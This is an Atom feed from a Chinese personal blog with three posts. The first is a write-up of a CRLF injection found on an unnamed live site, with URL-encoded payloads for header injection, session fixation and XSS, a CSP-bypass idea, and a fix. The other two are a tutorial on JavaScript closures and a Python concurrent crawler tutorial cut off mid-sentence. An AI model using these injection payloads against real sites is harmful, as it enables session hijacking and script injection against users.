<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A2u13&#39;s Blog</title>
  
  <subtitle>Love You &amp;&amp; Love Me</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://a2u13.com/"/>
  <updated>2020-06-12T17:00:04.640Z</updated>
  <id>https://a2u13.com/</id>
  
  <author>
    <name>A2u13</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CRLF漏洞实例</title>
    <link href="https://a2u13.com/2020/06/13/CRLF%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B/"/>
    <id>https://a2u13.com/2020/06/13/CRLF%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B/</id>
    <published>2020-06-12T16:06:35.000Z</published>
    <updated>2020-06-12T17:00:04.640Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>某站发现的一个 <code>CRLF</code> 漏洞以及一些利用思考</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近真的是太忙了，实习要学习<code>JS安全</code>和浏览器漏洞挖掘之类的</p><p>但我二进制不是很好，所以还在狂补二进制知识，对于一个<code>Web</code>狗的感觉太酸爽了</p><p>而且学校安排的实习无聊且浪费时间，写着<code>Java Spring</code>和前端开发，但这明明是我不需要的-_-</p><p>今晚抽空测了一下熟悉的某站，发现了一个很少有人听说和利用的漏洞，就想放松一下，记录一下这个漏洞和实例，复习我久违的<code>Web</code>o(╥﹏╥)o</p><h1 id="CRLF漏洞简介"><a href="#CRLF漏洞简介" class="headerlink" title="CRLF漏洞简介"></a>CRLF漏洞简介</h1><p>在 <code>HTTP</code>的 <code>Header</code>当中，状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔</p><p>或者理解为首部最后一个字段有两个CRLF，首部和主体由两个CRLF分隔。</p><p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p><blockquote><p>CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。</p></blockquote><p>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.baidu.com</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 7</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://www.baidu.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Referer</span>: https://www.baidu.com/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">a2u13=1</span><br></pre></td></tr></table></figure><p>再看看他的十六进制表示</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200613002033698.png" alt="image-20200613002033698"></p><p>可知他的 <code>POST</code>请求当中头部和消息体是通过两个<code>\r\n</code>进行分隔的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200613002017528.png" alt="image-20200613002017528"></p><p>头部之间是通过一个<code>\r\n</code>进行分隔的</p><p>知道  <code>HTTP</code>数据包是这么构成的就可以了，接下来讲一下实际的挖掘方法</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>一般而言，<code>CRLF</code>漏洞多见于可控<code>HTTP</code>头部的属性，这里举个最常见的例子，302重定向</p><p>如果说，一个<code>URL</code>想要对重定向到一个新的地址，他可能会把参数放到<code>GET</code>请求中的<code>query</code>部位，或者放到<code>POST</code>数据当中，很明显这两个点是很容易控制的，比如：</p><blockquote><p><code>http://xxx.xxx.com?goto=www.baidu.com</code></p></blockquote><p>其中如果进行跳转的话，则会在302跳转包中新增一个字段</p><blockquote><p><code>Location: www.baidu.com</code></p></blockquote><p>如果此时程序员没有对跳转的地址进行过滤的话，就很有可能让我们实现插入<code>CRLF</code>从而实现头部注入，从而实现下面几个点的漏洞，这里拿一个真实的站点做演示</p><h2 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h2><p>如果我们在原跳转地址后面写上<code>%0d%0a</code>进行换行，插入自定义的字段<code>Set-cookie:JSPSESSID%3DA2u13</code>，然后经过解码之后，会在302跳转中看到我们的插入的<code>Set-cookie</code>已经生效了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200613003110072.png" alt="image-20200613003110072"></p><p>但下面还有个原本的<code>Set-cookie</code>怎么办呢，办法是把他通过两个<code>CRLF</code>挤到<code>body</code>当中，但是又因为是<code>GET</code>请求，所以被挤下去的头部也会被服务器忽略，从而实现了会话固定</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200613003616263.png" alt="image-20200613003616263"></p><p>对于<code>POST</code>请求而言，原理一致，只要能让服务器解析原本的<code>POST</code>即可</p><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>由于我这个站是只能接受<code>GET</code>请求，对于<code>POST</code>请求会忽略消息体，所以我们用一个例子来展示一下</p><p>同样是<code>http://xxx.xxx.com?goto=www.baidu.com</code></p><p>如果此时我们使用两个<code>CRLF</code>来划开消息头部和消息体</p><p><code>http://xxx.xxx.com?goto=www.baidu.com%0d%0aX-XSS-Protection%3A%200%0d%0a%0d%0a%3Cimg%20src%3D%23%20onerror%3Dalert(1)%3B%20%2F%3E</code></p><p>此时就会产生这种情况</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attribute">Date</span>: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line"><span class="attribute">Content-Type</span>: text/html </span><br><span class="line"><span class="attribute">Content-Length</span>: 154 </span><br><span class="line"><span class="attribute">Connection</span>: close </span><br><span class="line"><span class="attribute">Location</span>: www.baidu.com</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 0</span><br><span class="line"></span><br><span class="line">&lt;img src=# onerror=alert(1); /&gt;</span><br></pre></td></tr></table></figure><p>是不是我们插入的<code>XSS</code>语句进入了消息体当中？</p><p>而且插入了<code>X-XSS-Protection: 0</code>，对于一部分浏览器会关闭<code>XSS-filter</code>，就可以利用</p><p>但是这种利用还是有些鸡肋的，毕竟302跳转是没有<code>POST</code>消息体的</p><p>所以说，只要是能找到一个<code>POST</code>请求，并且头部可控无<code>CRLF</code>过滤时，就可以用来打<code>XSS</code></p><h2 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h2><p>如果说你很幸运，发现可控的头部正好位于<code>Content-Security-Policy</code>的上方</p><p>那么就可以利用上面的采用两个<code>CRLF</code>把<code>CSP</code>挤到消息体当中，从而使<code>CSP</code>失效</p><p>如果<code>CSP</code>下面有部分需要数据不能被挤到消息体当中时，可以提前把数据写到可控头部字段值中</p><p>不过这也是一个假想，毕竟这种站太少了，如果能遇到的话，可以利用<code>CRLF</code>漏洞完美绕过<code>CSP</code>的防护</p><h1 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h1><p>很简单，把传入头部字段的所有数据都过滤<code>\r和\n</code>即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;某站发现的一个 &lt;code&gt;CRLF&lt;/code&gt; 漏洞以及一些利用思考&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://a2u13.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CRLF" scheme="https://a2u13.com/tags/CRLF/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript闭包</title>
    <link href="https://a2u13.com/2020/06/06/JavaScript%E9%97%AD%E5%8C%85/"/>
    <id>https://a2u13.com/2020/06/06/JavaScript%E9%97%AD%E5%8C%85/</id>
    <published>2020-06-06T07:31:49.000Z</published>
    <updated>2020-06-07T06:28:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容:</strong></p><p>JavaScript闭包概念以及应用</p><a id="more"></a><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606154108463.png" alt="image-20200606154108463"></p><p>在函数体外定义的变量为全局变量（即window对象），任何函数都可以直接访问全局变量中定义的变量</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606154533658.png" alt="image-20200606154533658"></p><p>很明显，定义在函数内部的变量为函数私有变量，在函数内部可以被访问到，而在外部是不可以访问到函数内部定义的变量</p><blockquote><p>函数内部变量一定要通过<code>var</code>进行声明！</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606154618263.png" alt="image-20200606154618263"></p><p>但这里需要注意的是，在局部变量的声明当中一定要使用<code>var</code>进行变量声明，否则声明的为全局变量，函数内外都可以访问到</p><h1 id="如何访问函数内部变量？"><a href="#如何访问函数内部变量？" class="headerlink" title="如何访问函数内部变量？"></a>如何访问函数内部变量？</h1><p>由于<code>JavaScript</code>函数的特性，父函数中定义的子函数对于父函数的属性都是可见的，反之父函数对于子函数内部的变量是不可知，这个概念和定义在全局域中的函数不可被外部访问到内部变量的道理是一致的</p><p>举个例子：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606155235492.png" alt="image-20200606155235492"></p><p>反之不可以</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606155400209.png" alt="image-20200606155400209"></p><p>但这里有个特点就是，既然子函数可以读取到父函数的变量值，那么我们如果子函数当做父函数的返回值的话，效果如何呢？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606155735292.png" alt="image-20200606155735292"></p><p>合在一起就是这个，简单理解一下就可以</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606155943782.png" alt="image-20200606155943782"></p><h1 id="JavaScript闭包"><a href="#JavaScript闭包" class="headerlink" title="JavaScript闭包"></a>JavaScript闭包</h1><blockquote><p>「闭包」，是指拥有多个变量和绑定了这些变量的环境的表达式（通常是一个函数），因而这些变量也是该表达式的一部分。</p></blockquote><p>上面提到的<code>func_2</code>函数就是我们闭包了</p><p>这里套用阮一峰的一个例子</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">　　　　<span class="keyword">var</span> n=<span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">　　　　nAdd=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n+=<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">　　　　<span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="built_in">console</span>.log(n);</span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　　<span class="keyword">return</span> f2;</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">var</span> result=f1();</span><br><span class="line"></span><br><span class="line">　　result(); <span class="comment">// 999</span></span><br><span class="line"></span><br><span class="line">　　nAdd();</span><br><span class="line"></span><br><span class="line">　　result(); <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606180855282.png" alt="image-20200606180855282"></p><p>这里给的解释是<code>f2</code>为闭包函数，其中<code>f1</code>函数返回值为<code>f2</code>，从而可以访问到<code>f1</code>中的内部变量<strong>n</strong>，这里由于<code>var result=f1();</code>的存在，使得<code>f2</code>成为了一个全局变量，在内存中持续存在，从而不会被浏览器的回收机制给回收。</p><p>其中有一点，<code>nAdd=function(){n+=1}</code>，这个由于没有使用<code>var</code>声明，所以ndd实际上为全局变量，这样使得在每次调用<code>nAdd()</code>时，都会对函数内部的变量进行修改</p><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><p><a href="https://www.quirksmode.org/js/this.html" target="_blank" rel="noopener">https://www.quirksmode.org/js/this.html</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.style.color = <span class="string">'#cc0000'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200607123716078.png" alt="image-20200607123716078"></p><blockquote><p>如果嵌套函数作为函数调用，其this值不是全局对象（非严格模式下）就是undefined（严格模式下）; 如果嵌套函数作为方法调用，其this值指向调用它的对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.onclick = doSomething;</span><br></pre></td></tr></table></figure><p>该函数将全部复制到<code>onclick</code>属性（现在变成方法）。因此，如果执行事件处理程序，则<code>this</code>引用HTML元素，并且该元素将 <code>color</code>被更改</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200607124938299.png" alt="image-20200607124938299"></p><p>如果作为函数调用</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">onclick</span>=<span class="string">"doSomething()"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这时候<code>this</code>指向的是<code>window</code>对象，这个肯定不会存在<code>style.color</code>属性的，所以就会报错</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200607125205921.png" alt="image-20200607125205921"></p><p><strong>区别</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.onclick = doSomething;</span><br><span class="line"><span class="built_in">console</span>.log(element.onclick)</span><br></pre></td></tr></table></figure><p>得到结果是</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.style.color = <span class="string">'#cc0000'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而如果作为函数引用来使用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;element onclick=<span class="string">"doSomething()"</span>&gt;</span><br><span class="line"><span class="built_in">console</span>.log(element.onclick)</span><br></pre></td></tr></table></figure><p>得到的结果是</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onclick</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">doSomething()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显看到区别所在</p><h2 id="几个思考题"><a href="#几个思考题" class="headerlink" title="几个思考题"></a>几个思考题</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">  name : <span class="string">"My Object"</span>,</span><br><span class="line"></span><br><span class="line">  getNameFunc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">alert(object.getNameFunc()());</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200606183837220.png" alt="image-20200606183837220"></p><p>这个的坑点在于理解<code>this</code>的作用域</p><p>所以这里指向的是全局变量<code>name</code>，打印出<code>The Window</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">var</span> object = &#123;</span><br><span class="line">　　　　name : <span class="string">"My Object"</span>,</span><br><span class="line"></span><br><span class="line">　　　　getNameFunc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line">　　　　　　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　　　<span class="keyword">return</span> that.name;</span><br><span class="line">　　　　　　&#125;;</span><br><span class="line"></span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　&#125;;</span><br><span class="line"></span><br><span class="line">　　alert(object.getNameFunc()());</span><br></pre></td></tr></table></figure><p>这个我认为是吧<code>this</code>的结果保存到<code>that</code>之后，然后通过返回<code>that.name</code>，这个实际上返回的是作为<code>object</code>对象的<code>name</code>，调用的是局部变量值<code>object.name</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JavaScript闭包概念以及应用&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://a2u13.com/categories/JavaScript/"/>
    
    
      <category term="闭包" scheme="https://a2u13.com/tags/%E9%97%AD%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>异步编程:从高并发爬虫看异步编程</title>
    <link href="https://a2u13.com/2020/04/14/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B-%E4%BB%8E%E9%AB%98%E5%B9%B6%E5%8F%91%E7%88%AC%E8%99%AB%E7%9C%8B%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    <id>https://a2u13.com/2020/04/14/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B-%E4%BB%8E%E9%AB%98%E5%B9%B6%E5%8F%91%E7%88%AC%E8%99%AB%E7%9C%8B%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</id>
    <published>2020-04-14T04:02:29.000Z</published>
    <updated>2020-06-07T06:28:28.914Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>python当中的异步并发编程以及编程实例</p><a id="more"></a><h1 id="python相关模块"><a href="#python相关模块" class="headerlink" title="python相关模块"></a>python相关模块</h1><p>相关模块以及调用方法</p><p><a href="https://blog.csdn.net/jpch89/article/details/87643972" target="_blank" rel="noopener">Python 中 concurrent.futures 模块使用说明</a></p><p><a href="https://www.liaoxuefeng.com/wiki/897692888725344/966405998508320" target="_blank" rel="noopener">gevent</a></p><p><a href="https://www.jianshu.com/p/bb6c7f9aa1ae" target="_blank" rel="noopener">python之gevent（1）</a></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>这里我会根据实际的一个高并发爬虫来演示如何利用多进程、多线程以及协程进行组合从而实现一个并发数可控的高并发爬虫</p><p>我们这里目标选择<a href="https://www.52bqg.com/book_203/" target="_blank" rel="noopener">https://www.52bqg.com/book_203/</a></p><p>即我以前很喜欢看的<code>校花的贴身高手</code>，目前差不多8300章，很适合测试爬虫效率</p><h2 id="链接爬取"><a href="#链接爬取" class="headerlink" title="链接爬取"></a>链接爬取</h2><p>对于连接的爬取，这里采用一开始就先在主线程进行调用，将所有的章节的<code>href</code>存到一个列表之后进行下一步操作</p><p>这里也可以设计成一个单独的进程处理连接爬取任务，主要的额外操作在于需要设置<code>Lock</code>或者<code>Semaphore</code>来进行同步，让子进程处理完连接爬取任务后从而释放锁，进行下一步的并发爬虫操作，这里我们先简单使用列表进行连接存储，以后会进行改进使用队列</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndexUrl</span><span class="params">(indexUrl)</span>:</span></span><br><span class="line">    allUrls = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = session.get(url=indexUrl)</span><br><span class="line">        bs = BeautifulSoup(res.content.decode(<span class="string">"GBK"</span>), <span class="string">"lxml"</span>)</span><br><span class="line">        lists = bs.find(<span class="string">"div"</span>, id=<span class="string">"list"</span>)</span><br><span class="line">        dd = lists.find_all(<span class="string">"dd"</span>)</span><br><span class="line">        <span class="keyword">for</span> eachdd <span class="keyword">in</span> dd:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a = eachdd.find(<span class="string">"a"</span>)</span><br><span class="line">                href = a[<span class="string">'href'</span>]</span><br><span class="line">                allUrls.append(indexUrl + href)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> allUrls</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是网页编码</p><h2 id="链接分组"><a href="#链接分组" class="headerlink" title="链接分组"></a>链接分组</h2><p>由于采用多进程、多线程和协程组合，所以需要对每一个协程分配任务，这里就需要对链接进行分组，要满足每一个协程都能分配到合适的任务，由于多进程和多线程都需要对链接列表进行分组切割，这里我写了一个<code>splitUrl</code>类用来处理连接分组任务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splitUrl</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, splitnum, urls)</span>:</span></span><br><span class="line">        self.splitnum = splitnum</span><br><span class="line">        self.urls = urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        num_urls = len(self.urls)</span><br><span class="line">        <span class="keyword">if</span> num_urls &lt; self.splitnum:</span><br><span class="line">            <span class="keyword">return</span> [self.urls]</span><br><span class="line">        perUrlNum = int(num_urls / self.splitnum)</span><br><span class="line">        splitted_urls = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.splitnum):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                splitted_urls.append(self.urls[: (i + <span class="number">1</span>) * perUrlNum])</span><br><span class="line">            <span class="keyword">elif</span> i == self.splitnum - <span class="number">1</span>:</span><br><span class="line">                splitted_urls.append(self.urls[i * perUrlNum:])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                splitted_urls.append(self.urls[i * perUrlNum: (i + <span class="number">1</span>) * perUrlNum])</span><br><span class="line">        <span class="keyword">return</span> splitted_urls</span><br></pre></td></tr></table></figure><p>逻辑很简单，根据设置的分组个数以及总的<code>url</code>列表进行分组，最终效果如下（这里显示为8进程分组）</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200414123646833.png" alt="image-20200414123646833"></p><h2 id="多进程设计"><a href="#多进程设计" class="headerlink" title="多进程设计"></a>多进程设计</h2><p>多进程我们这里选择采用<code>concurrent.futures</code>作为异步模块，调用其中的<code>ProcessPoolExecutor</code>作为进程池，方便操作系统对进程进行调度</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ProcessPoolExecutor, wait, ALL_COMPLETED</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiProcessScheduler</span><span class="params">(splitted_urls)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CPU_NUM</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        executor = ProcessPoolExecutor(max_workers=CPU_NUM)</span><br><span class="line">        all_tasks = executor.map(threadScheduler, splitted_urls)</span><br><span class="line">        wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里我们提前在主线程讲所有链接分好组，然后直接在<code>multiProcessScheduler</code>进行调用</p><p>首先我们需要获得当前的<code>CPU核数</code>，超过<code>CPU核数</code>的多进程数是没有意义的，反而影响操作系统的进程间调度</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> cpu_count</span><br><span class="line">CPU_NUM = cpu_count()</span><br></pre></td></tr></table></figure><p>然后实例化<code>ProcessPoolExecutor</code>类，其中每一个进程要执行的是我们下一步要调用的<code>threadScheduler</code>函数，它的参数是我们已经初步分好组的url</p><p>采用<code>map</code>函数来进行批量设置（此map函数非python标准库的map函数）</p><p>对于单独要设置的任务要采用<code>submit</code>进行手工提交</p><blockquote><p><code>submit(fn, *args, **kwargs)</code></p></blockquote><p>安排可调用对象 fn 以 <code>fn(*args, **kwargs)</code> 的形式执行，并返回 <code>Future</code> 对象来表示它的执行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">1</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    future = executor.submit(pow, <span class="number">323</span>, <span class="number">1235</span>)</span><br><span class="line">    print(future.result())</span><br></pre></td></tr></table></figure><p>这里要注意，必须设置<code>wait</code>来对主线程进行阻塞，退出条件是所有进程中的任务全部完毕时候才会释放对主进程的阻塞，否则主进程提前结束会导致所有的并发失败</p><h2 id="多线程设计"><a href="#多线程设计" class="headerlink" title="多线程设计"></a>多线程设计</h2><p>同理，我们需要对多进程传进来的分组url列表进行二次分组，我这里偷懒写入了线程当中，如果想提高速度的话，建议在主线程一开始就分好线程的组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threadScheduler</span><span class="params">(urlss)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> THREAD_NUM</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        splitted_urls = splitUrl(THREAD_NUM, urlss).run()</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=THREAD_NUM)</span><br><span class="line">        all_tasks = executor.map(greenletScheduler, splitted_urls)</span><br><span class="line">        wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里选择我们开辟的线程池大小，对于每一个线程都调用我们的<code>greenletScheduler</code>函数，即我们的协程</p><p>同理需要设置<code>wait</code>需要阻塞线程防止提前结束</p><h2 id="协程设计"><a href="#协程设计" class="headerlink" title="协程设计"></a>协程设计</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool <span class="keyword">as</span> ge_pool</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greenletScheduler</span><span class="params">(urls)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> GEVENT_NUM</span><br><span class="line">    greenlet_pool = ge_pool(GEVENT_NUM)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        greenlet_pool.apply_async(getContent, (url,))</span><br><span class="line">    greenlet_pool.join()</span><br></pre></td></tr></table></figure><p>这个是专门为了改造所有的模块使之能够变为异步操作，这个需要放到代码最开始的地方从而实现把<code>socket、ssl、threading和 select</code>等模块变为协程，这一过程需要在启动时通过monkey 